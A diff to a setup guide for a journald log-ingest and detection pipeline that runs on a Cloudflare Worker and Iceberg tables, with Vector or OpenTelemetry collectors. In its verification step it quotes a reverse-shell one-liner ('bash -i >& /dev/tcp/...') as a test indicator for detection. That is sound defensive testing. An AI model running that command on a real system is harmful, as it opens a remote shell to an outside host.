@@ -39,7 +39,7 @@ Follow these steps to provision Cloudflare Basin resources and deploy the `journ
    (Use [pipeline-fanout.sql](../../adapters/storage/cloudflare-basin-iceberg/pipeline-fanout.sql) if you want an additional `yara_detections` Iceberg table.)
 
 3. **Configure Worker binding and secret, then deploy**
-   - Confirm `pipelines[0].stream` in [wrangler.jsonc](../../adapters/ingest/cloudflare-worker-basin/wrangler.jsonc) matches `--stream` (`journal_stream`).
+   - Copy the `<STREAM_ID>` emitted by `provision-basin.sh` (or run `npx wrangler basin pipelines streams list` to inspect the stream's `id`) into `pipelines[0].stream` in [wrangler.jsonc](../../adapters/ingest/cloudflare-worker-basin/wrangler.jsonc) — Wrangler expects the **Stream ID**, not the stream name.
    - Run tests and typecheck:
      ```bash
      npm --prefix adapters/ingest/cloudflare-worker-basin run typecheck
@@ -51,12 +51,14 @@ Follow these steps to provision Cloudflare Basin resources and deploy the `journ
      npx --prefix adapters/ingest/cloudflare-worker-basin wrangler deploy
      ```
 
-4. **Point host collector (`Vector`) at the Worker**
+4. **Point host collector (`Vector` or `OTel Collector`) at the Worker**
    - Set `OOF_INGEST_URL="https://<worker-url>/v1/logs"` and `OOF_INGEST_TOKEN="<same-bearer-token>"`.
-   - Start Vector with [vector.yaml](../../adapters/collect/vector-journald/vector.yaml):
+   - Validate and start Vector with [vector.yaml](../../adapters/collect/vector-journald/vector.yaml) (Vector `0.60+`/`0.61+` requires `--dangerously-allow-env-var-interpolation` or `VECTOR_DANGEROUSLY_ALLOW_ENV_VAR_INTERPOLATION=true` when interpolating `${...}` env vars):
      ```bash
-     vector --config adapters/collect/vector-journald/vector.yaml
+     vector validate --no-environment --dangerously-allow-env-var-interpolation adapters/collect/vector-journald/vector.yaml
+     vector --dangerously-allow-env-var-interpolation --config adapters/collect/vector-journald/vector.yaml
      ```
+   - Alternatively, run OpenTelemetry Collector with [otelcol.yaml](../../adapters/collect/otel-collector-journald/otelcol.yaml) (`otlphttp/oof_logs` uses `encoding: json`, which the Worker unpacks automatically).
 
 5. **Verify Iceberg ingestion**
    - Send a synthetic test log via `curl` (including a benign event and a test indicator like `bash -i >& /dev/tcp/10.0.0.1/4444`) and confirm HTTP `202` `{ "accepted": ..., "matched": ... }`.
